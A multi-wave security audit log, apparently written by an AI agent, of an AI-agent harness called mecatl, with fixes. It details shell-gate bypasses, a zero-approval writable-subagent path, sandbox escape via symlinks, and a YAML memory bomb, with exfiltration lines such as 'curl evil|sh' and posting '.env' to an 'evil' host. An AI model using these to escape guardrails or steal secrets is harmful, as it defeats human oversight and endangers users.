# mecatl — Security Audit (first-principles zero-day hunt)

Branch: `claude/pensive-hopper-yrtoyd`
Started: 2026-09-16
Method: multi-agent, multi-wave, first-principles code analysis (no changelog/git-diff/internet).

## Threat model / win conditions
- Remote process crash (DoS) by an authenticated or unauthenticated user.
- Server-side arbitrary command execution (RCE) — remote, auth or unauth.
- Authentication / limit / validation bypass.
- Privilege escalation (lower-priv role → higher-priv; child → parent; project → operator tier).
- Sandbox escape (shell gate bypass, filesystem confinement escape, secret exfiltration).
- Deserialization / mass-assignment / injection.

## Attacker-facing surfaces (map)
- gRPC + HTTP/SSE server: `internal/adapter/server/{grpc,http,authn,cors,ownership,mcp_authorization,mcp_broker,worktree_selector,placement}.go`
- Auth/identity: `authn/oidc/*`, `internal/adapter/{clientauth,credentialstore}/*`, `mcp/oauthlogin/runtime.go`, `internal/adapter/resourceurl`, `internal/adapter/llmendpoint/url.go`
- Shell gate: `engine/governance/{shell,evaluator,substitution}.go`, `engine/internal/shellcompat/diagnostic.go`, `engine/adapter/fstools/shell.go`, `internal/app/escapeclassifier.go`
- Filesystem confinement / sandbox: `internal/adapter/osfs/osfs.go`, `engine/adapter/fstools/*`, `internal/adapter/forker/*`
- Permission model / escalation: `engine/governance/*`, `engine/agent/{dispatch,subagent,childask}.go`, `internal/app/{posture,guardrails}.go`
- Persistence / deserialization: `internal/adapter/server/mapper.go`, `internal/adapter/store/jsonlstore/*`, `internal/adapter/redisstore/*`, `engine/adapter/{sessnap,eventsource}/*`
- Egress: `engine/adapter/webfetch/*`, `engine/adapter/search/*`, MCP client
- Env/secrets: `internal/adapter/envscrub/*`, `internal/adapter/gitenv/*`
- Dependencies: `mvdan.cc/sh/v3` (shell parse), `goccy/go-yaml`, `bmatcuk/doublestar/v4`, `robfig/cron/v3`, `redis/go-redis/v9`, `golang-jwt/jwt/v5`, `coreos/go-oidc/v3`, `google.golang.org/{grpc,protobuf}`, `toolhive-core/redisconn`

## Approach registry (families)
- **F1 Shell-gate / command-exec bypass** — parser-vs-exec divergence, read-only misclassification.
- **F2 Filesystem sandbox escape** — path confinement, symlink, TOCTOU, read-roots, forker.
- **F3 Server ingress / auth bypass** — bearer/OIDC, interceptors, CORS, ownership, caller-identity, MCP-auth, worktree HMAC selector.
- **F4 Deserialization / crash / DoS** — proto mapper, jsonl/redis store, snapshot restore, event fold, unbounded alloc, nil deref.
- **F5 Privilege escalation / permission model** — scope precedence, floored-allow, subagent ask-review, audience, guardrails operator-tier, child-id spoof.
- **F6 Dependency interactions + SSRF + envscrub** — mvdan/sh vs /bin/sh, yaml, glob, redis, jwt; webfetch SSRF; secret-scrub gaps.

Status legend: 🔵 active · 🟡 stalled · 🔴 blocked · ✅ confirmed finding · ❌ ruled out

---

## Wave log

### Wave 1 — COMPLETE (5/6 reported; F2 filesystem still running)
- A→F1 shell gate; B→F2 fs/forker; C→F3 server auth; D→F4 deserialization/crash; E→F5 perm/escalation; F→F6 deps+SSRF+envscrub.
- **Results:** ✅ CONFIRMED-1 (F1 shell `\'` desync, RCE/deny-bypass) · ✅ CONFIRMED-2 (F5 writable-subagent allow-all, zero-approval RCE) · ✅ CONFIRMED-3 (F6 goccy YAML O(n²) OOM) · 🕵️ CANDIDATE-2 (F4 unbounded HTTP body DoS) · F3 no ingress bypass (hardened) + lead L1 · leads L1-L7.
- All three CONFIRMED were independently re-verified by the root agent (own PoCs / measurements / code reads), not accepted on the sub-agent's word.

### Approach registry status
- F1 shell-gate → ✅ CONFIRMED (root cause found). Family productive; keep for L2/L3 escalation chains.
- F2 filesystem → ✅ CONFIRMED-4 (forker merge-back dest-symlink escape). Main osfs confinement solid. Lead L8 (gitattributes smudge).
- F3 server auth → 🔴 blocked (hardened; no reachable ingress bypass). Reopen only for L1 (driver exposure) or L6 (toolhive-authn validator).
- F4 crash/DoS → 🟡 CANDIDATE-2 pending double-check; ValidateJSON/hookexec low.
- F5 perm/escalation → ✅ CONFIRMED. Family productive; L2 convergence.
- F6 deps/SSRF → ✅ CONFIRMED (goccy). SSRF surfaces hardened (ruled out). Reopen for L6 (toolhive-authn).

### Wave 2 — planned (launch after this commit)
- Verify CANDIDATE-2 (F4 body DoS) — root double-check of the schedule/session handlers.
- L2: end-to-end writable-subagent / `git config` shared-.git escalation PoC (F5×F1 convergence).
- L6: clone + audit `toolhive-core/authn` validator construction (alg allowlist/audience/JWKS) — the one un-read dependency behind the whole auth story.
- Underexplored NEW families: (i) MCP broker `VMCP` token endpoint (F3 residual); (ii) client-MCP tool registration path; (iii) compaction/event-fold hostile-snapshot; (iv) provider SSE→chunk parsing under a hostile upstream. Keep F2 result incoming.

---

## Confirmed / candidate findings

### ✅ CONFIRMED-1 (F1, HIGH) — Shell-gate parser/executor desync: unquoted `\'`/`\"` smuggles commands past `SplitCommands`/`ReadOnlyShell`
**Root cause.** `engine/governance/shell.go` `SplitCommands` (L23-80) and `HasSubstitutionOrGrouping` (L94-130) are a hand-rolled quote scanner with **no backslash handling in the unquoted state**. The unquoted switch (L53/L57) has `case c=='\''`/`case c=='"'` that unconditionally ENTER quote state; a `\` falls through to `buf.WriteRune` (L76). So an unquoted `\'` writes `\` then flips `inSingle=true` — the gate treats everything after as "quoted," swallowing `;`/`|`/`&&`/`$()` into ONE segment. dash (`/bin/sh`) treats `\'` as an escaped literal that does NOT enter quote mode, so the trailing `;` is a real separator. Same raw bytes run at `exec.CommandContext(ctx, r.shell, "-c", command)` (`internal/adapter/osfs/osfs.go:1514`).
**Root-agent INDEPENDENT verification (own PoC, not the agent's):**
- Real `governance` funcs: `echo \' ; git commit -am pwned` → `SplitCommands`=**1 seg**, `ReadOnlyShell`=**true** (control `echo hi ; git commit` → 2 segs, false). `echo \" ; git push --force origin main` → 1 seg, **true**.
- Real dash exec of the gate-approved string `echo \' ; sed -i s/original/PWNED/ victim.txt ; echo > marker.txt` → `victim.txt`=**PWNED**, `marker.txt` **created** (2nd + 3rd commands ran).
**Impacts (each a distinct control bypass):**
- **(B, most severe) Deny-dominance bypass** — a configured `Deny Shell "git push*"` is glob-matched against the whole 1-segment string and never fires. Under `auto`/`yolo` (allow-all + deny fence) the smuggled mutation resolves **Allow, silently** — defeats AGENTS.md's "deny-dominance holds at EVERY tier incl. yolo." Under `strict` the specific Deny degrades to the generic Shell Ask.
- **(A) Plan-mode hard-deny bypass** — `planModeDecision` (`evaluator.go`) only hard-denies when `ReadOnlyShell==false`; a smuggled mutation reads `true`, so plan mode (contract: mutations impossible) degrades it to Ask/Allow, and *presents it as read-only*.
- **(C) Guardrail skip** — the default Shell guardrail sets `SkipReadOnlyShell:true` (`internal/app/guardrails.go`); `echo \' ; curl evil|sh` reads read-only ⇒ the PreToolUse content checker never inspects it.
- `writeIndicators` catches bare `rm`/`mv`/`cp`/`chmod` tokens even in the swallowed segment (so `rm` → false), but `git commit`/`git push`/`sed -i`/`curl`/`python3 -c`/`sh -c`/`make` are NOT in that set and classify read-only.
**Reachability:** the `command` string is the model's Shell arg, executed verbatim; any prompt-injected/misaligned model with Shell triggers it. **Fix:** model an unquoted `\` as escaping one following char in BOTH scanners (so `\'`/`\"` don't enter quote state), or replace the hand-rolled scanner with the already-vendored `mvdan.cc/sh` parser; fuzz against `sh -c`.

### ✅ CONFIRMED-2 (F5, HIGH) — direct-write `Subagent{mode:"read-write"}` bypasses the mutate-ask gate + guardrails (zero-approval RCE on the real workspace)
A prompt-injected main model, on the DEFAULT `strict` posture + any FS session, emits ONE tool call `Subagent{"mode":"read-write","prompt":"<malicious>"}` and gets arbitrary Edit/Write/Shell against the REAL workspace with **no human approval and no guardrail check** — where the main agent would Ask for every one of those.
**Root-agent verification (all confirmed in the real composition):**
- (a) **Subagent call is auto-approved.** `defaultRules()` (`internal/app/build.go:8995`) = `{Tool:"Subagent", Effect:Allow}` at the floor, vs `Shell/Edit/Write → Ask` (8996-8998). The `mode` arg is not a matchable pattern, so `mode:"read-write"` is floor-Allowed with no ask. The floor-Allow was justified (comment 9000-9001) for the *read-only* explorer — the exact oversight.
- (b) **Writable engine wired unconditionally** (`build.go:7339-7340` `WithWritableChildEngine(buildWritableSubagentChildEngine(...))`), skipped only under no-FS. `validateMode` accepts `read-write` whenever `writableChildEngine!=nil` — no posture/trust/interactivity gate.
- (c) **Allow-all child policy, not the main policy.** `buildWritableSubagentChildEngine`→`writableExplorerDeps` (`build.go:6894,6913-6917`) → `childEngineDepsForProvider(...)` which sets `Policy: childPermPolicy(cfg)` (`build.go:6657`) = `AllowAllFloorRules` (`childRules`/`childPermPolicy` 9210/9246); `writableExplorerDeps` never overrides it back. So the child's Edit/Write/Shell resolve **Allow**, never Ask.
- (d) **Guardrails absent.** `writableExplorerDeps` passes `nil` hooks → `childEngineDepsForProvider` defaults `hookexec.New(nil)` (guardrail-free). Operator `guardrails:` block never runs in the writable child.
- (e) **Real runner.** `directWriteCommandRunner(cfg)` = the MAIN session's `buildCommandRunner` against the real tree (no fork/copy/merge). Only substitution (A1 global) is floored to Ask; plain `rm`/`sh payload.sh`/`curl --data-binary @/repo/.env https://evil` all resolve **Allow**.
**Violates the documented invariant:** ADR 0077 states 3× (lines 58-59/68/96-97) the writable child's "Bash/Edit/Write resolve at **main-session parity under the operator's posture/policy**." The implementation gives it the allow-all child policy + guardrail-free hooks instead. Removing the A2 isolation auto-approve (`isolated:false`) is moot because the policy UNDER it is blanket-allow.
**Fix:** build the writable-subagent engine with the MAIN policy (`mainRules`+`mainEvaluatorOptions`, or at least the mutate-ask floor) AND wire the guardrail Runner into it; the runner is already main-parity, the policy/hooks are not.
**Convergence w/ F1-secondary:** the SAME `childRules` allow-all also means an *isolated* read-only child auto-Allows plain escape verbs (`git config core.pager '!cmd'` writing shared `.git/config`, `rm -rf <abs>`, `git push`) — only substitution is floored. Shared root cause: child policy is allow-all; only substitution gates child Shell.

### SECONDARY (F5, MEDIUM, under verification) — `git remote`/`git tag` classified read-only
`engine/governance/shell.go` `readOnlyGitSubcommands` includes `remote` and `tag`; `simpleReadOnly` checks only the subcommand, not args ⇒ `git tag <name>` (writes a ref), `git remote add`/`git remote set-url origin ext::sh -c '<cmd>'` (writes `.git/config`, stages code-exec on next fetch) classified read-only. Impact: plan-mode mutation + A1/global read-only-substitution misclassification. `git config` is correctly excluded but `remote`/`tag` were missed. `worktreeEscapeGitSubcommands` rejects `remote` (A2 safe) but NOT `tag`.

### ✅ CONFIRMED-3 (F6, HIGH DoS) — goccy/go-yaml O(n²) parse blowup → OOM crash via a repo config file (pre-trust-gate)
`github.com/goccy/go-yaml@v1.19.2`'s parser builds a per-node YAMLPath string; a depth-`d` nested flow **sequence** `[[[…]]]` makes the path O(k) at level k, stored on each of d nodes ⇒ **O(d²)** time+memory. goccy's `maxDecodeDepth` guard fires in the DECODE phase, but the O(d²) allocation happens earlier in `parser.ParseBytes` (UNGUARDED).
**Root-agent INDEPENDENT measurement** (real v1.19.2, `parser.ParseBytes(data,0)` — the exact permconfig call): depth 2000/4KB→8 MB, 8000/16KB→104 MB, 20000/40KB→640 MB, 40000/80KB→**2.4 GB** (0.4→1.0 s), all `err=false` (parses fine). ⇒ a ~150 KB file (under the `maxConfigBytes`=256 KiB cap) allocates 5–10 GB → OOM.
**Call-site + reachability (UNCONDITIONAL, before trust):** `internal/adapter/permconfig/permconfig.go:57` `parser.ParseBytes` in `parseYAML`; `resolve.go:688` parses EVERY project config file present; `applyTrustGate` runs AFTER (`resolve.go:801`) — project DENY rules bind regardless of trust (tighten-only), so the file must be parsed pre-trust. `permpolicy.Resolve` runs on the first `Evaluate` of any session.
**Attacker input:** commit `.mecatl/settings.yaml` with `z: [[[…~131000 '['…]]]` (<256 KB). Any session run against that repo (mecatui/mecated, or the `mecatequi`/`mecak8s` headless issue→PR bot on an attacker branch — all `PermissionsConventional:true`) OOM-kills the process on the first permission eval; in multi-tenant `mecated` it takes down all tenants; re-fires every run (dies during parse, before the resolver cache populates).
**Bigger latent exposure:** `agentfs/discover.go:372`, `skillfs/discover.go:240`, `rulesfs/discover.go:218` `os.ReadFile` with NO byte cap then `yaml.Unmarshal` — project-tier is trust-gated (`projectIngestionAdmitted`) but user-tier `~/.claude/*` and any trusted repo eat an uncapped bomb.
**Fix:** cap NESTING DEPTH (or node/token count) before/during parse; add byte caps to the discover paths.

### ✅ CONFIRMED-4 (F2, HIGH) — forker merge-back writes OUTSIDE the workspace via a destination-side symlink (sandbox escape, no approval)
The file tools' `os.Root` confinement is solid, but the git-fork **merge-back copier** is not. `internal/adapter/forker/forker.go` `copyFile` (L705-735) writes `dst` with `os.MkdirAll(filepath.Dir(dst))` + `os.OpenFile(dst, O_WRONLY|O_CREATE|O_TRUNC)` — **no `O_NOFOLLOW`, no `os.Root`** (the `//nolint:gosec` note only reasons about the fresh-child-dir call site). `mergeForkInner` step 3 (L906-933) copies each untracked fork file to `filepath.Join(parentRoot, rel)` — it Lstat-skips a SOURCE symlink and refuses an untracked `.gitattributes`, but never checks whether a DESTINATION path component under the REAL `parentRoot` is a symlink.
**Root-agent INDEPENDENT verification:** reproduced `copyFile`'s exact ops — with `parentRoot/out -> OUTSIDE` (a tracked `120000` symlink a malicious repo controls), `MkdirAll(parentRoot/out)`+`OpenFile(parentRoot/out/payload)` wrote `payload` into `OUTSIDE/` (outside the root). Confirmed at forker.go:930 the dst is `parentRoot/rel`.
**Trigger (default-ON, no approval):** `engine/agent/parallel.go` `autoMergeWinner`→`autoMerger.Merge(ctx, winner.childEnv, parentEnv)`, wired `internal/app/build.go:5619`→`catalog.go:473`; Parallel defaults on (`--enable-parallel` true, mecatui `EnableParallel:true`). A `Parallel(tasks:[…], join:"first")` auto-merges into the parent with NO separate permission check.
**Chain (Variant 1, any posture, no Shell):** malicious repo ships a tracked symlinked dir `out -> /home/user` (or `../..`); force-copy `copyTree` SKIPS it so the fork lacks `out`; a branch `Write`s untracked `out/payload` (real dir in the fork); auto-merge step 3 `copyFile(fork/out/payload → parentRoot/out/payload)` follows the parent symlink → writes `/home/user/payload`. Variant 2 (needs branch Shell): two Parallel calls stage+plant an escaping symlink via `git apply` (agent confirmed `git apply` plants an absolute escaping symlink), then write through it.
**Impact:** arbitrary out-of-root file write/overwrite as the agent uid (`~/.ssh/authorized_keys`, `~/.bashrc`, `~/.config/mecatl/settings.yaml`, real `.git/hooks/*`) → sandbox escape + persistence → RCE. Defeats the `escapePolicy` write-escape Ask entirely (the merge path isn't subject to it).
**Fix:** open `dst` through an `*os.Root` on `parentRoot`/`childDir`, or `O_NOFOLLOW` each component / `EvalSymlinks(dir(dst))` under-root check, at the merge/overlay call sites (`overlayDirtyInner` L573-590 has the same pattern).
**F2 also confirmed solid (dead-ends):** osfs `os.Root` airtight on Go 1.27 (read+write, all components); relaxed main-workspace classifier agrees with osfs by construction; child/direct-write confined view; skill assets (`ValidSkillAssetName`+OpenRoot+Lstat), SkillDraft, memory, CAS, Grep/Glob (doublestar `WithNoFollow` over os.Root) — no escape. Only the forker merge/overlay copy is vulnerable.
**Lead L8 (F2→F5, gitattributes smudge):** `gitenv.Scrub` can't neutralize an attacker-chosen `filter.<drv>.smudge`/`diff.<drv>.textconv` driver name in a tracked `.gitattributes`; smudge fires at fork-time `git worktree add` checkout. Untrusted repos are safe (sandboxed runner nil-gated), but on a TRUSTED repo the model can Write `.git/config`+`.gitattributes` (inside root) then spawn a read-only subagent whose checkout fires the smudge → per-command Shell-ask bypass.

### 🕵️ CANDIDATE-2 (F4, MEDIUM-HIGH DoS) — unbounded HTTP request body → memory-exhaustion
HTTP mux (`internal/adapter/server/http.go`) adds no global body limit; middleware chain `CORS→ProtectedResourceMetadata→auth.Middleware→handler` wraps none; `http.Server` sets only `ReadHeaderTimeout`, no `ReadTimeout`/`MaxBytes`. Cleanest sink: `decodeScheduleSpec` (`http.go:1874`) `io.ReadAll(r.Body)` with no `LimitReader`, reachable via `POST /v1/schedules` / `PUT /v1/schedules/{name}`; +16 handlers use `json.NewDecoder(r.Body).Decode` uncapped (createSession, teams, learning, storage migrations…). A multi-hundred-MB/GB body OOMs a memory-constrained pod. Only the two prompt endpoints wrap `MaxBytesReader(32 MiB)` — the *selective* limits prove there's no global cap (oversight). gRPC is NOT affected (4 MiB default `MaxRecvMsgSize`). Authenticated when auth on; unauthenticated on the supported no-auth TCP mode. Companion: missing `ReadTimeout` = slowloris. **To verify:** confirm no `MaxBytesReader` on the schedule/session handlers (agent grep) — needs a root double-check.

### Leads registry (for Wave 2 / cross-pollination)
- **L1 (F3, deployment):** `grpcdriver` server (`internal/adapter/grpcdriver/server.go:278-279`) builds `session.Principal{Issuer:req.GetOwnerIssuer(), Subject:req.GetOwnerSubject()}` straight from the wire with NO auth interceptor / NO verification ⇒ full ownership bypass IFF a driver process is network-exposed without its own mTLS. By design a private storage-backend link (AGENTS.md acknowledges ADR-0213/#452 leaves it unverified). Same trust assumption in redis/jsonl `OwnershipEnforced` (caller-supplied Owner). Flag to deployment/hardening.
- **L2 (F1/F5 convergence, HIGH):** child policy is allow-all; only substitution floors child Shell ⇒ `git config core.pager '!cmd'` on the SHARED worktree `.git/config` persists code-exec that fires on the parent's next git call (main runner NOT `gitenv.Scrub`'d, only `envscrub`). Combine with F1 `\'` desync to also smuggle substitution past A1. Wave-2: end-to-end PoC through a live subagent.
- **L3 (F1-secondary):** `git remote`/`git tag` misclassified read-only (`shell.go readOnlyGitSubcommands`) → plan-mode mutation + A1 global. One-line map fix; audit `describe`/`shortlog`/`blame` for write-flag forms.
- **L4 (F6-secondary, MED-LOW):** envscrub denylist misses `SSH_AUTH_SOCK` (operator's agent → sign/push as operator), `KUBECONFIG`, `GIT_ASKPASS`/`SSH_ASKPASS`, `DOCKER_AUTH_CONFIG`, lowercase names. Denylist not allowlist. Depends on harness env.
- **L5 (F1/F2, exfil):** `internal/app/escapeclassifier.go:36-39` documents an in-process FS Read of `/proc/self/environ` returns the server's RAW UNSCRUBBED env — a secret channel the envscrubbed Shell lacks. Pair with F5 writable child (Read is floor-Allow) to exfil provider keys/GH_TOKEN. **Depends on F2's read-confinement audit (pending).**
- **L6 (F3):** JWT verification fully delegated to `toolhive-core/authn` — audit the validator construction (issuer/audience/JWKS/alg allowlist) in that dep (not yet cloned/read). `{"alg":"none"}` helper is test-only in mecatl.
- **L7 (F4):** hookexec unbounded stdout `bytes.Buffer`; `ValidateJSON` schema recursion (model-authored, low reach).

## Ruled out / dead ends

### Root-agent independent recon (Wave 1, parallel to agents)
- **Redis key injection (cross-session R/W via session-id metacharacters)** — ❌ ruled out. `internal/adapter/redisstore/metadata_index.go`: all Redis keys are passed via `KEYS[]` (built Go-side by `sessionKey(id)` = `"mecatl:session:"+id` string concat, not a glob/pattern); owner scope is SHA-256-hashed (`metadataOwnerScope`), so no attacker text reaches an index key; `pageMetadataScript` uses `ZRANGEBYLEX` with a validated cursor member; and `decodeMetadataRows` re-checks `request.Owner.SameIdentity(row.Owner)` on `OwnershipEnforced` as row-level defense-in-depth. The `mecatl:session:` prefix (trailing colon) can't be crafted to collide with control keys (`mecatl:session-metadata:*`, `mecatl:events:`, `mecatl:tools:`). No injection.
- **jsonlstore filename path-traversal (client id / schedule name → file outside store dir)** — ❌ ruled out. `legacySafeName` (`jsonlstore.go:1326`) maps every rune outside `[a-zA-Z0-9._-]` to `_` and rewrites a leading `.` to `_`, so `/` and `..` cannot survive: `../../etc/passwd` → `_.._.._etc_passwd`. `safeFilePart` (schedules/fire ids) delegates to it. Traversal-proof.
  - ⚠️ Minor residual (LOW, jsonl backend only): `legacySafeName` is LOSSY/non-injective — distinct schedule names collide to one filename (`a/b` and `a_b` → `a_b`). If schedule NAME is client-controlled and not owner-namespaced on disk, a name-collision could overwrite/hijack another schedule's file. Needs: (1) is schedule name client-controlled on the wire? (2) is the on-disk file owner-scoped? → handed to F4/wave-2.

### Root-agent recon: F7 mecatequi CI patch-as-data (`.github/actions/mecatequi-publish/publish.sh`) — well-defended (tested)
- The publish job applies the agent's diff as DATA (`git apply --3way --index`), env-fed inputs (no argv splice), template substitution literal/single-pass/display-only, and a **protected-path gate** rejecting patches touching `.github/`, `.gitattributes`, `.git/`, `Makefile`, `Taskfile.yaml` via `git apply --numstat -z` (correctly using `-z` to defeat the C-quoting path-bypass).
- **Tested bypass attempt (symlink-through-directory):** a patch creating `link -> .github` then writing `link/evil.yml` makes numstat report `link/evil.yml` — the protected-path gate **PASSES it (does not block)**. BUT `git apply --3way --index` refuses: `error: affected file 'link/evil.yml' is beyond a symbolic link` (git 2.43 symlink hardening). So the two layers hold on modern git. ⚠️ Residual (defense-in-depth): the gate itself IS bypassable; the sole backstop is git's symlink check — an old/patched git (<2.14) or another numstat-vs-apply path divergence would fail the gate open. Handed to F7/wave-2 as low-priority.
- Numstat-parse-fail ⇒ gate empties ⇒ passes, but `--3way` shares the same diff parser, so an unparseable-by-numstat patch is also unappliable — no divergence there. Blast radius further bounded by: agent job holds NO GitHub token; envscrub scrubs provider keys from the shell; PR still needs human merge.

### Open questions feeding the families
- **Is the session ID client-controlled on the CreateSession wire?** `server.WithSessionID` exists (used by scheduler `sched--` path, `session_id_override_test.go`) but appears to be an internal Go option. If a wire field maps to it, several id-based invariants (child-id prefix guard `isDelegationChildSessionID`, owner scoping, redis/jsonl keying) get attacker-controlled input. → F3/F4 must confirm.
- **Owner-principal provenance (crux for F3 + scheduler escalation).** `scheduler_fire.go` runs each fire under `schedulerOwnerContext` = `session.WithPrincipal(ctx, sched.Spec.Owner)` and stamps the fire session owner = `fireSessionOwner(sched.Spec.Owner)`. So the fire executes with the **schedule's captured owner identity**. If a low-priv caller can set/spoof `sched.Spec.Owner` at CreateSchedule (client field rather than authenticated principal), a fire escalates to that identity. Same question governs `CreateSession` owner and every `Owner.SameIdentity` ownership check. → **F3 must trace: is `Principal` derived from the verified auth token/OIDC claims, or from a client-supplied request field?** This is the single highest-leverage crux.

### Root-agent recon: front-door auth (`internal/adapter/server/authn.go`) — SOLID; resolves the owner-provenance crux
- **Owner spoofing via a client field is CLOSED.** The `Principal` on the handler context comes ONLY from the verified validator output (`UnaryInterceptor`/`StreamInterceptor` → `authGRPC` → `session.WithPrincipal(ctx, p)` where `p` is `Validator.Validate(bearer)`), never a request field. `admissiblePrincipal` re-checks at the edge: rejects nil/empty iss|sub, `GrantTypeSystem`, the internal issuer (`syscaller.Issuer`), invalid grant enum, and NUL in identity (owner-key-collision defense). Constant-time token compare (`subtle.ConstantTimeCompare`). Duplicate `authorization` metadata rejected (no first/last-value ambiguity). So the scheduler's captured `Spec.Owner` = the authenticated caller; a low-priv caller cannot mint a fire as someone else.
- **Residual risk re-aimed for F3/F6 (NOT owner-spoofing):**
  1. **Validator soundness** — the real JWT/OIDC checks are DELEGATED to `toolhive-core/authn` (injected `PrincipalValidator`). If it skips audience/issuer/exp/signature or is alg-confusable, everything downstream falls. → F6 must audit that dep + `authn/oidc`.
  2. **Authorization (not authentication) coverage** — is the per-session `Owner.SameIdentity` ownership check applied on EVERY mutating/read RPC (StartRunContent, Approve/Deny, ListCommands/Worktrees, Clear/Fork, schedule CRUD, transcript/event read)? A single unguarded RPC = cross-tenant access with a valid low-priv token. → F3's core.
  3. **Identity-OFF default** — `Validator==nil` ⇒ `p==nil` everywhere ⇒ all sessions ownerless (documented loopback posture). The dangerous middle config is **static-token-only** (shared credential, zero subjects): every holder co-owns all sessions. Confirm no RPC assumes identity is on.

### Root-agent recon: scheduler fire path (`internal/app/scheduler_fire.go`) — mostly well-defended
- Fire runs read-leaning (plan mode) unless `Spec.Mutating`; applies subagent-grade turn/tool caps; owner-scoped ctx; ownerless schedule keeps system ctx and *fails closed* at caller-owned boundaries. Carried context is FENCED untrusted (not seeded history). Watchdog cancel → StopTimeout. No obvious elevation *given* a trustworthy `Spec.Owner`. The whole security of this path reduces to the owner-provenance crux above.
